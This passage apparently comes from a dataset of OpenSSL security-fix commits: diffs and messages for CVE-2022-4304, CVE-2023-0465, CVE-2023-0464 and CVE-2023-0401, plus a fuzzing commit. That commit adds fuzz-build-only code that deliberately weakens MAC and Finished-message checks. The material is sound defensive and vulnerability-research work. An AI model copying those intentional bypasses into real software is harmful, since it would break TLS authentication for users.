    \ = (t1 - t2 - c) & BN_MASK2;\n-        if (t1 != t2)\n-            c = (t1 <\
    \ t2);\n+        t2 = (t1 - c) & BN_MASK2;\n+        c  = (t2 > t1);\n+      \
    \  t1 = b[3];\n+        t1 = (t2 - t1) & BN_MASK2;\n+        r[3] = t1;\n+   \
    \     c += (t1 > t2);\n         a += 4;\n         b += 4;\n         r += 4;\n\
    @@ -408,10 +416,12 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG *a, const\
    \ BN_ULONG *b,\n #endif\n     while (n) {\n         t1 = a[0];\n-        t2 =\
    \ b[0];\n-        r[0] = (t1 - t2 - c) & BN_MASK2;\n-        if (t1 != t2)\n-\
    \            c = (t1 < t2);\n+        t2 = (t1 - c) & BN_MASK2;\n+        c  =\
    \ (t2 > t1);\n+        t1 = b[0];\n+        t1 = (t2 - t1) & BN_MASK2;\n+    \
    \    r[0] = t1;\n+        c += (t1 > t2);\n         a++;\n         b++;\n    \
    \     r++;\n@@ -441,7 +451,7 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG\
    \ *a, const BN_ULONG *b,\n         t += c0;                /* no carry */  \\\n\
    \         c0 = (BN_ULONG)Lw(t);                   \\\n         hi = (BN_ULONG)Hw(t);\
    \                   \\\n-        c1 = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n\
    +        c1 = (c1+hi)&BN_MASK2; c2 += (c1<hi);   \\\n         } while(0)\n \n\
    \ #  define mul_add_c2(a,b,c0,c1,c2)      do {    \\\n@@ -450,11 +460,11 @@ BN_ULONG\
    \ bn_sub_words(BN_ULONG *r, const BN_ULONG *a, const BN_ULONG *b,\n         BN_ULLONG\
    \ tt = t+c0;    /* no carry */  \\\n         c0 = (BN_ULONG)Lw(tt);          \
    \        \\\n         hi = (BN_ULONG)Hw(tt);                  \\\n-        c1\
    \ = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n+        c1 = (c1+hi)&BN_MASK2; c2\
    \ += (c1<hi);   \\\n         t += c0;                /* no carry */  \\\n    \
    \     c0 = (BN_ULONG)Lw(t);                   \\\n         hi = (BN_ULONG)Hw(t);\
    \                   \\\n-        c1 = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n\
    +        c1 = (c1+hi)&BN_MASK2; c2 += (c1<hi);   \\\n         } while(0)\n \n\
    \ #  define sqr_add_c(a,i,c0,c1,c2)       do {    \\\n@@ -463,7 +473,7 @@ BN_ULONG\
    \ bn_sub_words(BN_ULONG *r, const BN_ULONG *a, const BN_ULONG *b,\n         t\
    \ += c0;                /* no carry */  \\\n         c0 = (BN_ULONG)Lw(t);   \
    \                \\\n         hi = (BN_ULONG)Hw(t);                   \\\n-  \
    \      c1 = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n+        c1 = (c1+hi)&BN_MASK2;\
    \ c2 += (c1<hi);   \\\n         } while(0)\n \n #  define sqr_add_c2(a,i,j,c0,c1,c2)\
    \ \\\n@@ -478,26 +488,26 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG\
    \ *a, const BN_ULONG *b,\n         BN_ULONG ta = (a), tb = (b);            \\\n\
    \         BN_ULONG lo, hi;                        \\\n         BN_UMULT_LOHI(lo,hi,ta,tb);\
    \             \\\n-        c0 += lo; hi += (c0<lo)?1:0;            \\\n-     \
    \   c1 += hi; c2 += (c1<hi)?1:0;            \\\n+        c0 += lo; hi += (c0<lo);\
    \                \\\n+        c1 += hi; c2 += (c1<hi);                \\\n   \
    \      } while(0)\n \n #  define mul_add_c2(a,b,c0,c1,c2)      do {    \\\n  \
    \       BN_ULONG ta = (a), tb = (b);            \\\n         BN_ULONG lo, hi,\
    \ tt;                    \\\n         BN_UMULT_LOHI(lo,hi,ta,tb);            \
    \ \\\n-        c0 += lo; tt = hi+((c0<lo)?1:0);        \\\n-        c1 += tt;\
    \ c2 += (c1<tt)?1:0;            \\\n-        c0 += lo; hi += (c0<lo)?1:0;    \
    \        \\\n-        c1 += hi; c2 += (c1<hi)?1:0;            \\\n+        c0\
    \ += lo; tt = hi + (c0<lo);            \\\n+        c1 += tt; c2 += (c1<tt); \
    \               \\\n+        c0 += lo; hi += (c0<lo);                \\\n+   \
    \     c1 += hi; c2 += (c1<hi);                \\\n         } while(0)\n \n # \
    \ define sqr_add_c(a,i,c0,c1,c2)       do {    \\\n         BN_ULONG ta = (a)[i];\
    \                   \\\n         BN_ULONG lo, hi;                        \\\n\
    \         BN_UMULT_LOHI(lo,hi,ta,ta);             \\\n-        c0 += lo; hi +=\
    \ (c0<lo)?1:0;            \\\n-        c1 += hi; c2 += (c1<hi)?1:0;          \
    \  \\\n+        c0 += lo; hi += (c0<lo);                \\\n+        c1 += hi;\
    \ c2 += (c1<hi);                \\\n         } while(0)\n \n #  define sqr_add_c2(a,i,j,c0,c1,c2)\
    \    \\\n@@ -512,26 +522,26 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG\
    \ *a, const BN_ULONG *b,\n         BN_ULONG ta = (a), tb = (b);            \\\n\
    \         BN_ULONG lo = ta * tb;                  \\\n         BN_ULONG hi = BN_UMULT_HIGH(ta,tb);\
    \     \\\n-        c0 += lo; hi += (c0<lo)?1:0;            \\\n-        c1 +=\
    \ hi; c2 += (c1<hi)?1:0;            \\\n+        c0 += lo; hi += (c0<lo);    \
    \            \\\n+        c1 += hi; c2 += (c1<hi);                \\\n       \
    \  } while(0)\n \n #  define mul_add_c2(a,b,c0,c1,c2)      do {    \\\n      \
    \   BN_ULONG ta = (a), tb = (b), tt;        \\\n         BN_ULONG lo = ta * tb;\
    \                  \\\n         BN_ULONG hi = BN_UMULT_HIGH(ta,tb);     \\\n-\
    \        c0 += lo; tt = hi + ((c0<lo)?1:0);      \\\n-        c1 += tt; c2 +=\
    \ (c1<tt)?1:0;            \\\n-        c0 += lo; hi += (c0<lo)?1:0;          \
    \  \\\n-        c1 += hi; c2 += (c1<hi)?1:0;            \\\n+        c0 += lo;\
    \ tt = hi + (c0<lo);            \\\n+        c1 += tt; c2 += (c1<tt);        \
    \        \\\n+        c0 += lo; hi += (c0<lo);                \\\n+        c1\
    \ += hi; c2 += (c1<hi);                \\\n         } while(0)\n \n #  define\
    \ sqr_add_c(a,i,c0,c1,c2)       do {    \\\n         BN_ULONG ta = (a)[i];   \
    \                \\\n         BN_ULONG lo = ta * ta;                  \\\n   \
    \      BN_ULONG hi = BN_UMULT_HIGH(ta,ta);     \\\n-        c0 += lo; hi += (c0<lo)?1:0;\
    \            \\\n-        c1 += hi; c2 += (c1<hi)?1:0;            \\\n+      \
    \  c0 += lo; hi += (c0<lo);                \\\n+        c1 += hi; c2 += (c1<hi);\
    \                \\\n         } while(0)\n \n #  define sqr_add_c2(a,i,j,c0,c1,c2)\
    \      \\\n@@ -546,8 +556,8 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG\
    \ *a, const BN_ULONG *b,\n         BN_ULONG lo = LBITS(a), hi = HBITS(a);  \\\n\
    \         BN_ULONG bl = LBITS(b), bh = HBITS(b);  \\\n         mul64(lo,hi,bl,bh);\
    \                     \\\n-        c0 = (c0+lo)&BN_MASK2; if (c0<lo) hi++; \\\n\
    -        c1 = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n+        c0 = (c0+lo)&BN_MASK2;\
    \ hi += (c0<lo);   \\\n+        c1 = (c1+hi)&BN_MASK2; c2 += (c1<hi);   \\\n \
    \        } while(0)\n \n #  define mul_add_c2(a,b,c0,c1,c2)      do {    \\\n\
    @@ -556,17 +566,17 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG *a, const\
    \ BN_ULONG *b,\n         BN_ULONG bl = LBITS(b), bh = HBITS(b);  \\\n        \
    \ mul64(lo,hi,bl,bh);                     \\\n         tt = hi;              \
    \                  \\\n-        c0 = (c0+lo)&BN_MASK2; if (c0<lo) tt++; \\\n-\
    \        c1 = (c1+tt)&BN_MASK2; if (c1<tt) c2++; \\\n-        c0 = (c0+lo)&BN_MASK2;\
    \ if (c0<lo) hi++; \\\n-        c1 = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n+\
    \        c0 = (c0+lo)&BN_MASK2; tt += (c0<lo);   \\\n+        c1 = (c1+tt)&BN_MASK2;\
    \ c2 += (c1<tt);   \\\n+        c0 = (c0+lo)&BN_MASK2; hi += (c0<lo);   \\\n+\
    \        c1 = (c1+hi)&BN_MASK2; c2 += (c1<hi);   \\\n         } while(0)\n \n\
    \ #  define sqr_add_c(a,i,c0,c1,c2)       do {    \\\n         BN_ULONG lo, hi;\
    \                        \\\n         sqr64(lo,hi,(a)[i]);                   \
    \ \\\n-        c0 = (c0+lo)&BN_MASK2; if (c0<lo) hi++; \\\n-        c1 = (c1+hi)&BN_MASK2;\
    \ if (c1<hi) c2++; \\\n+        c0 = (c0+lo)&BN_MASK2; hi += (c0<lo);   \\\n+\
    \        c1 = (c1+hi)&BN_MASK2; c2 += (c1<hi);   \\\n         } while(0)\n \n\
    \ #  define sqr_add_c2(a,i,j,c0,c1,c2) \\"
  - "--- a/crypto/bn/bn_blind.c\n+++ b/crypto/bn/bn_blind.c\n@@ -189,7 +189,8 @@ int\
    \ BN_BLINDING_invert_ex(BIGNUM *n, const BIGNUM *r, BN_BLINDING *b,\n        \
    \     n->top = (int)(rtop & ~mask) | (ntop & mask);\n             n->flags |=\
    \ (BN_FLG_FIXED_TOP & ~mask);\n         }\n-        ret = BN_mod_mul_montgomery(n,\
    \ n, r, b->m_ctx, ctx);\n+        ret = bn_mul_mont_fixed_top(n, n, r, b->m_ctx,\
    \ ctx);\n+        bn_correct_top_consttime(n);\n     } else {\n         ret =\
    \ BN_mod_mul(n, n, r, b->mod, ctx);\n     }"
  - "--- a/crypto/bn/bn_lib.c\n+++ b/crypto/bn/bn_lib.c\n@@ -1106,6 +1106,28 @@ BIGNUM\
    \ *bn_wexpand(BIGNUM *a, int words)\n     return (words <= a->dmax) ? a : bn_expand2(a,\
    \ words);\n }\n \n+void bn_correct_top_consttime(BIGNUM *a)\n+{\n+    int j, atop;\n\
    +    BN_ULONG limb;\n+    unsigned int mask;\n+\n+    for (j = 0, atop = 0; j\
    \ < a->dmax; j++) {\n+        limb = a->d[j];\n+        limb |= 0 - limb;\n+ \
    \       limb >>= BN_BITS2 - 1;\n+        limb = 0 - limb;\n+        mask = (unsigned\
    \ int)limb;\n+        mask &= constant_time_msb(j - a->top);\n+        atop =\
    \ constant_time_select_int(mask, j + 1, atop);\n+    }\n+\n+    mask = constant_time_eq_int(atop,\
    \ 0);\n+    a->top = atop;\n+    a->neg = constant_time_select_int(mask, 0, a->neg);\n\
    +    a->flags &= ~BN_FLG_FIXED_TOP;\n+}\n+\n void bn_correct_top(BIGNUM *a)\n\
    \ {\n     BN_ULONG *ftl;"
  - "--- a/crypto/rsa/rsa_ossl.c\n+++ b/crypto/rsa/rsa_ossl.c\n@@ -257,6 +257,7 @@\
    \ static int rsa_blinding_invert(BN_BLINDING *b, BIGNUM *f, BIGNUM *unblind,\n\
    \      * will only read the modulus from BN_BLINDING. In both cases it's safe\n\
    \      * to access the blinding without a lock.\n      */\n+    BN_set_flags(f,\
    \ BN_FLG_CONSTTIME);\n     return BN_BLINDING_invert_ex(f, unblind, b, ctx);\n\
    \ }\n \n@@ -536,6 +537,11 @@ static int rsa_ossl_private_decrypt(int flen, const\
    \ unsigned char *from,\n         goto err;\n     }\n \n+    if (rsa->flags & RSA_FLAG_CACHE_PUBLIC)\n\
    +        if (!BN_MONT_CTX_set_locked(&rsa->_method_mod_n, rsa->lock,\n+      \
    \                              rsa->n, ctx))\n+            goto err;\n+\n    \
    \ if (!(rsa->flags & RSA_FLAG_NO_BLINDING)) {\n         blinding = rsa_get_blinding(rsa,\
    \ &local_blinding, ctx);\n         if (blinding == NULL) {\n@@ -573,13 +579,6\
    \ @@ static int rsa_ossl_private_decrypt(int flen, const unsigned char *from,\n\
    \             goto err;\n         }\n         BN_with_flags(d, rsa->d, BN_FLG_CONSTTIME);\n\
    -\n-        if (rsa->flags & RSA_FLAG_CACHE_PUBLIC)\n-            if (!BN_MONT_CTX_set_locked(&rsa->_method_mod_n,\
    \ rsa->lock,\n-                                        rsa->n, ctx)) {\n-    \
    \            BN_free(d);\n-                goto err;\n-            }\n       \
    \  if (!rsa->meth->bn_mod_exp(ret, f, d, rsa->n, ctx,\n                      \
    \              rsa->_method_mod_n)) {\n             BN_free(d);"
  commit_message: 'Alternative fix for CVE-2022-4304


    This is about a timing leak in the topmost limb

    of the internal result of RSA_private_decrypt,

    before the padding check.


    There are in fact at least three bugs together that

    caused the timing leak:


    First and probably most important is the fact that

    the blinding did not use the constant time code path

    at all when the RSA object was used for a private

    decrypt, due to the fact that the Montgomery context

    rsa->_method_mod_n was not set up early enough in

    rsa_ossl_private_decrypt, when BN_BLINDING_create_param

    needed it, and that was persisted as blinding->m_ctx,

    although the RSA object creates the Montgomery context

    just a bit later.


    Then the infamous bn_correct_top was used on the

    secret value right after the blinding was removed.


    And finally the function BN_bn2binpad did not use

    the constant-time code path since the BN_FLG_CONSTTIME

    was not set on the secret value.


    In order to address the first problem, this patch

    makes sure that the rsa->_method_mod_n is initialized

    right before the blinding context.


    And to fix the second problem, we add a new utility

    function bn_correct_top_consttime, a const-time

    variant of bn_correct_top.


    Together with the fact, that BN_bn2binpad is already

    constant time if the flag BN_FLG_CONSTTIME is set,

    this should eliminate the timing oracle completely.


    In addition the no-asm variant may also have

    branches that depend on secret values, because the last

    invocation of bn_sub_words in bn_from_montgomery_word

    had branches when the function is compiled by certain

    gcc compiler versions, due to the clumsy coding style.


    So additionally this patch stream-lined the no-asm

    C-code in order to avoid branches where possible and

    improve the resulting code quality.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20281)'
  commit_sha: f06ef1657a3d4322153b26231a7afa3d55724e52
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/x509_vfy.c\n+++ b/crypto/x509/x509_vfy.c\n@@ -1670,15 +1670,23\
    \ @@ static int check_policy(X509_STORE_CTX *ctx)\n     }\n     /* Invalid or\
    \ inconsistent extensions */\n     if (ret == X509_PCY_TREE_INVALID) {\n-    \
    \    int i;\n+        int i, cbcalled = 0;\n \n         /* Locate certificates\
    \ with bad extensions and notify callback. */\n-        for (i = 1; i < sk_X509_num(ctx->chain);\
    \ i++) {\n+        for (i = 0; i < sk_X509_num(ctx->chain); i++) {\n         \
    \    X509 *x = sk_X509_value(ctx->chain, i);\n \n+            if ((x->ex_flags\
    \ & EXFLAG_INVALID_POLICY) != 0)\n+                cbcalled = 1;\n           \
    \  CB_FAIL_IF((x->ex_flags & EXFLAG_INVALID_POLICY) != 0,\n                  \
    \      ctx, x, i, X509_V_ERR_INVALID_POLICY_EXTENSION);\n         }\n+       \
    \ if (!cbcalled) {\n+            /* Should not be able to get here */\n+     \
    \       ERR_raise(ERR_LIB_X509, ERR_R_INTERNAL_ERROR);\n+            return 0;\n\
    +        }\n+        /* The callback ignored the error so we return success */\n\
    \         return 1;\n     }\n     if (ret == X509_PCY_TREE_FAILURE) {"
  commit_message: 'Ensure that EXFLAG_INVALID_POLICY is checked even in leaf certs


    Even though we check the leaf cert to confirm it is valid, we

    later ignored the invalid flag and did not notice that the leaf

    cert was bad.


    Fixes: CVE-2023-0465


    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20585)'
  commit_sha: e4142ec43bcc08ffdb090580e24c24a7da302a32
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/pcy_node.c\n+++ b/crypto/x509/pcy_node.c\n@@ -59,16 +59,21\
    \ @@ X509_POLICY_NODE *ossl_policy_level_find_node(const X509_POLICY_LEVEL *level,\n\
    \ X509_POLICY_NODE *ossl_policy_level_add_node(X509_POLICY_LEVEL *level,\n   \
    \                                           X509_POLICY_DATA *data,\n        \
    \                                      X509_POLICY_NODE *parent,\n-          \
    \                                   X509_POLICY_TREE *tree)\n+               \
    \                              X509_POLICY_TREE *tree,\n+                    \
    \                         int extra_data)\n {\n     X509_POLICY_NODE *node;\n\
    \ \n+    /* Verify that the tree isn't too large.  This mitigates CVE-2023-0464\
    \ */\n+    if (tree->node_maximum > 0 && tree->node_count >= tree->node_maximum)\n\
    +        return NULL;\n+\n     node = OPENSSL_zalloc(sizeof(*node));\n     if\
    \ (node == NULL)\n         return NULL;\n     node->data = data;\n     node->parent\
    \ = parent;\n-    if (level) {\n+    if (level != NULL) {\n         if (OBJ_obj2nid(data->valid_policy)\
    \ == NID_any_policy) {\n             if (level->anyPolicy)\n                 goto\
    \ node_error;\n@@ -88,7 +93,7 @@ X509_POLICY_NODE *ossl_policy_level_add_node(X509_POLICY_LEVEL\
    \ *level,\n         }\n     }\n \n-    if (tree) {\n+    if (extra_data) {\n \
    \        if (tree->extra_data == NULL)\n             tree->extra_data = sk_X509_POLICY_DATA_new_null();\n\
    \         if (tree->extra_data == NULL) {\n@@ -101,6 +106,7 @@ X509_POLICY_NODE\
    \ *ossl_policy_level_add_node(X509_POLICY_LEVEL *level,\n         }\n     }\n\
    \ \n+    tree->node_count++;\n     if (parent)\n         parent->nchild++;\n "
  - "--- a/crypto/x509/pcy_tree.c\n+++ b/crypto/x509/pcy_tree.c\n@@ -14,6 +14,17 @@\n\
    \ \n #include \"pcy_local.h\"\n \n+/*\n+ * If the maximum number of nodes in the\
    \ policy tree isn't defined, set it to\n+ * a generous default of 1000 nodes.\n\
    + *\n+ * Defining this to be zero means unlimited policy tree growth which opens\
    \ the\n+ * door on CVE-2023-0464.\n+ */\n+#ifndef OPENSSL_POLICY_TREE_NODES_MAX\n\
    +# define OPENSSL_POLICY_TREE_NODES_MAX 1000\n+#endif\n+\n static void expected_print(BIO\
    \ *channel,\n                            X509_POLICY_LEVEL *lev, X509_POLICY_NODE\
    \ *node,\n                            int indent)\n@@ -161,6 +172,9 @@ static\
    \ int tree_init(X509_POLICY_TREE **ptree, STACK_OF(X509) *certs,\n     if ((tree\
    \ = OPENSSL_zalloc(sizeof(*tree))) == NULL)\n         return X509_PCY_TREE_INTERNAL;\n\
    \ \n+    /* Limit the growth of the tree to mitigate CVE-2023-0464 */\n+    tree->node_maximum\
    \ = OPENSSL_POLICY_TREE_NODES_MAX;\n+\n     /*\n      * http://tools.ietf.org/html/rfc5280#section-6.1.2,\
    \ figure 3.\n      *\n@@ -177,7 +191,7 @@ static int tree_init(X509_POLICY_TREE\
    \ **ptree, STACK_OF(X509) *certs,\n     if ((data = ossl_policy_data_new(NULL,\n\
    \                                      OBJ_nid2obj(NID_any_policy), 0)) == NULL)\n\
    \         goto bad_tree;\n-    if (ossl_policy_level_add_node(level, data, NULL,\
    \ tree) == NULL) {\n+    if (ossl_policy_level_add_node(level, data, NULL, tree,\
    \ 1) == NULL) {\n         ossl_policy_data_free(data);\n         goto bad_tree;\n\
    \     }\n@@ -236,7 +250,8 @@ static int tree_init(X509_POLICY_TREE **ptree, STACK_OF(X509)\
    \ *certs,\n  * Return value: 1 on success, 0 otherwise\n  */\n static int tree_link_matching_nodes(X509_POLICY_LEVEL\
    \ *curr,\n-                                    X509_POLICY_DATA *data)\n+    \
    \                                X509_POLICY_DATA *data,\n+                  \
    \                  X509_POLICY_TREE *tree)\n {\n     X509_POLICY_LEVEL *last =\
    \ curr - 1;\n     int i, matched = 0;\n@@ -246,13 +261,13 @@ static int tree_link_matching_nodes(X509_POLICY_LEVEL\
    \ *curr,\n         X509_POLICY_NODE *node = sk_X509_POLICY_NODE_value(last->nodes,\
    \ i);\n \n         if (ossl_policy_node_match(last, node, data->valid_policy))\
    \ {\n-            if (ossl_policy_level_add_node(curr, data, node, NULL) == NULL)\n\
    +            if (ossl_policy_level_add_node(curr, data, node, tree, 0) == NULL)\n\
    \                 return 0;\n             matched = 1;\n         }\n     }\n \
    \    if (!matched && last->anyPolicy) {\n-        if (ossl_policy_level_add_node(curr,\
    \ data, last->anyPolicy, NULL) == NULL)\n+        if (ossl_policy_level_add_node(curr,\
    \ data, last->anyPolicy, tree, 0) == NULL)\n             return 0;\n     }\n \
    \    return 1;\n@@ -265,15 +280,16 @@ static int tree_link_matching_nodes(X509_POLICY_LEVEL\
    \ *curr,\n  * Return value: 1 on success, 0 otherwise.\n  */\n static int tree_link_nodes(X509_POLICY_LEVEL\
    \ *curr,\n-                           const X509_POLICY_CACHE *cache)\n+     \
    \                      const X509_POLICY_CACHE *cache,\n+                    \
    \       X509_POLICY_TREE *tree)\n {\n     int i;\n \n     for (i = 0; i < sk_X509_POLICY_DATA_num(cache->data);\
    \ i++) {\n         X509_POLICY_DATA *data = sk_X509_POLICY_DATA_value(cache->data,\
    \ i);\n \n         /* Look for matching nodes in previous level */\n-        if\
    \ (!tree_link_matching_nodes(curr, data))\n+        if (!tree_link_matching_nodes(curr,\
    \ data, tree))\n             return 0;\n     }\n     return 1;\n@@ -304,7 +320,7\
    \ @@ static int tree_add_unmatched(X509_POLICY_LEVEL *curr,\n     /* Curr may\
    \ not have anyPolicy */\n     data->qualifier_set = cache->anyPolicy->qualifier_set;\n\
    \     data->flags |= POLICY_DATA_FLAG_SHARED_QUALIFIERS;\n-    if (ossl_policy_level_add_node(curr,\
    \ data, node, tree) == NULL) {\n+    if (ossl_policy_level_add_node(curr, data,\
    \ node, tree, 1) == NULL) {\n         ossl_policy_data_free(data);\n         return\
    \ 0;\n     }\n@@ -367,7 +383,7 @@ static int tree_link_any(X509_POLICY_LEVEL *curr,\n\
    \     /* Finally add link to anyPolicy */\n     if (last->anyPolicy &&\n     \
    \        ossl_policy_level_add_node(curr, cache->anyPolicy,\n-               \
    \                        last->anyPolicy, NULL) == NULL)\n+                  \
    \                     last->anyPolicy, tree, 0) == NULL)\n         return 0;\n\
    \     return 1;\n }\n@@ -550,7 +566,7 @@ static int tree_calculate_user_set(X509_POLICY_TREE\
    \ *tree,\n             extra->flags = POLICY_DATA_FLAG_SHARED_QUALIFIERS\n   \
    \              | POLICY_DATA_FLAG_EXTRA_NODE;\n             node = ossl_policy_level_add_node(NULL,\
    \ extra, anyPolicy->parent,\n-                                              tree);\n\
    +                                              tree, 1);\n         }\n       \
    \  if (!tree->user_policies) {\n             tree->user_policies = sk_X509_POLICY_NODE_new_null();\n\
    @@ -577,7 +593,7 @@ static int tree_evaluate(X509_POLICY_TREE *tree)\n \n    \
    \ for (i = 1; i < tree->nlevel; i++, curr++) {\n         cache = ossl_policy_cache_set(curr->cert);\n\
    -        if (!tree_link_nodes(curr, cache))\n+        if (!tree_link_nodes(curr,\
    \ cache, tree))\n             return X509_PCY_TREE_INTERNAL;\n \n         if (!(curr->flags\
    \ & X509_V_FLAG_INHIBIT_ANY)"
  commit_message: 'x509: excessive resource use verifying policy constraints


    A security vulnerability has been identified in all supported versions

    of OpenSSL related to the verification of X.509 certificate chains

    that include policy constraints.  Attackers may be able to exploit this

    vulnerability by creating a malicious certificate chain that triggers

    exponential use of computational resources, leading to a denial-of-service

    (DoS) attack on affected systems.


    Fixes CVE-2023-0464


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Shane Lontis <shane.lontis@oracle.com>

    (Merged from https://github.com/openssl/openssl/pull/20571)'
  commit_sha: 3a81370f75b832102e9969533a25ca53fe0b254e
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/ssl/record/methods/tls_common.c\n+++ b/ssl/record/methods/tls_common.c\n\
    @@ -863,6 +863,11 @@ int tls_get_more_records(OSSL_RECORD_LAYER *rl)\n       \
    \          enc_err = 0;\n             if (thisrr->length > SSL3_RT_MAX_COMPRESSED_LENGTH\
    \ + mac_size)\n                 enc_err = 0;\n+#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n\
    +            if (enc_err == 0 && mac_size > 0 && (md[0] ^ thismb->mac[0]) != 0xFF)\
    \ {\n+                enc_err = 1;\n+            }\n+#endif\n         }\n    \
    \ }\n "
  - "--- a/ssl/ssl_sess.c\n+++ b/ssl/ssl_sess.c\n@@ -298,10 +298,15 @@ static int\
    \ def_generate_session_id(SSL *ssl, unsigned char *id,\n                     \
    \               unsigned int *id_len)\n {\n     unsigned int retry = 0;\n-   \
    \ do\n+    do {\n         if (RAND_bytes_ex(ssl->ctx->libctx, id, *id_len, 0)\
    \ <= 0)\n             return 0;\n-    while (SSL_has_matching_session_id(ssl,\
    \ id, *id_len) &&\n+#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n+       \
    \ if (retry > 0) {\n+            id[0]++;\n+        }\n+#endif\n+    } while (SSL_has_matching_session_id(ssl,\
    \ id, *id_len) &&\n            (++retry < MAX_SESS_ID_ATTEMPTS)) ;\n     if (retry\
    \ < MAX_SESS_ID_ATTEMPTS)\n         return 1;"
  - "--- a/ssl/statem/extensions_srvr.c\n+++ b/ssl/statem/extensions_srvr.c\n@@ -44,6\
    \ +44,7 @@ int tls_parse_ctos_renegotiate(SSL_CONNECTION *s, PACKET *pkt,\n {\n\
    \     unsigned int ilen;\n     const unsigned char *data;\n+    int ok;\n \n \
    \    /* Parse the length byte */\n     if (!PACKET_get_1(pkt, &ilen)\n@@ -58,8\
    \ +59,16 @@ int tls_parse_ctos_renegotiate(SSL_CONNECTION *s, PACKET *pkt,\n \
    \        return 0;\n     }\n \n-    if (memcmp(data, s->s3.previous_client_finished,\n\
    -               s->s3.previous_client_finished_len)) {\n+    ok = memcmp(data,\
    \ s->s3.previous_client_finished,\n+                    s->s3.previous_client_finished_len);\n\
    +#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n+    if (ok) {\n+        if\
    \ (data[0] ^ s->s3.previous_client_finished[0] != 0xFF) {\n+            ok = 0;\n\
    +        }\n+    }\n+#endif\n+    if (ok) {\n         SSLfatal(s, SSL_AD_HANDSHAKE_FAILURE,\
    \ SSL_R_RENEGOTIATION_MISMATCH);\n         return 0;\n     }"
  - "--- a/ssl/statem/statem_lib.c\n+++ b/ssl/statem/statem_lib.c\n@@ -787,6 +787,7\
    \ @@ MSG_PROCESS_RETURN tls_process_finished(SSL_CONNECTION *s, PACKET *pkt)\n\
    \     size_t md_len;\n     SSL *ssl = SSL_CONNECTION_GET_SSL(s);\n     int was_first\
    \ = SSL_IS_FIRST_HANDSHAKE(s);\n+    int ok;\n \n \n     /* This is a real handshake\
    \ so make sure we clean it up at the end */\n@@ -831,8 +832,16 @@ MSG_PROCESS_RETURN\
    \ tls_process_finished(SSL_CONNECTION *s, PACKET *pkt)\n         return MSG_PROCESS_ERROR;\n\
    \     }\n \n-    if (CRYPTO_memcmp(PACKET_data(pkt), s->s3.tmp.peer_finish_md,\n\
    -                      md_len) != 0) {\n+    ok = CRYPTO_memcmp(PACKET_data(pkt),\
    \ s->s3.tmp.peer_finish_md,\n+                       md_len);\n+#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n\
    +    if (ok != 0) {\n+        if (PACKET_data(pkt)[0] ^ s->s3.tmp.peer_finish_md[0]\
    \ != 0xFF) {\n+            ok = 0;\n+        }\n+    }\n+#endif\n+    if (ok !=\
    \ 0) {\n         SSLfatal(s, SSL_AD_DECRYPT_ERROR, SSL_R_DIGEST_CHECK_FAILED);\n\
    \         return MSG_PROCESS_ERROR;\n     }"
  commit_message: 'fuzz: make post handshake reachable


    So that CVE-2021-3449 can be found through fuzzing


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Kurt Roeckx <kurt@roeckx.be>

    (Merged from https://github.com/openssl/openssl/pull/20128)'
  commit_sha: 2b9e2afc382490592078cdb69d06f54f0fefd4c6
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/pkcs7/pk7_doit.c\n+++ b/crypto/pkcs7/pk7_doit.c\n@@ -84,7 +84,11\
    \ @@ static int pkcs7_bio_add_digest(BIO **pbio, X509_ALGOR *alg,\n     }\n  \
    \   (void)ERR_pop_to_mark();\n \n-    BIO_set_md(btmp, md);\n+    if (BIO_set_md(btmp,\
    \ md) <= 0) {\n+        ERR_raise(ERR_LIB_PKCS7, ERR_R_BIO_LIB);\n+        EVP_MD_free(fetched);\n\
    +        goto err;\n+    }\n     EVP_MD_free(fetched);\n     if (*pbio == NULL)\n\
    \         *pbio = btmp;\n@@ -523,7 +527,11 @@ BIO *PKCS7_dataDecode(PKCS7 *p7,\
    \ EVP_PKEY *pkey, BIO *in_bio, X509 *pcert)\n             }\n             (void)ERR_pop_to_mark();\n\
    \ \n-            BIO_set_md(btmp, md);\n+            if (BIO_set_md(btmp, md)\
    \ <= 0) {\n+                EVP_MD_free(evp_md);\n+                ERR_raise(ERR_LIB_PKCS7,\
    \ ERR_R_BIO_LIB);\n+                goto err;\n+            }\n             EVP_MD_free(evp_md);\n\
    \             if (out == NULL)\n                 out = btmp;"
  commit_message: 'pk7_doit.c: Check return of BIO_set_md() calls


    These calls invoke EVP_DigestInit() which can fail for digests

    with implicit fetches. Subsequent EVP_DigestUpdate() from BIO_write()

    or EVP_DigestFinal() from BIO_read() will segfault on NULL

    dereference. This can be triggered by an attacker providing

    PKCS7 data digested with MD4 for example if the legacy provider

    is not loaded.


    If BIO_set_md() fails the md BIO cannot be used.


    CVE-2023-0401


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Richard Levitte <levitte@openssl.org>'
  commit_sha: 6eebe6c0238178356114a96a7858f36b24172847
  repo_name: openssl/openssl
- commit_diff:
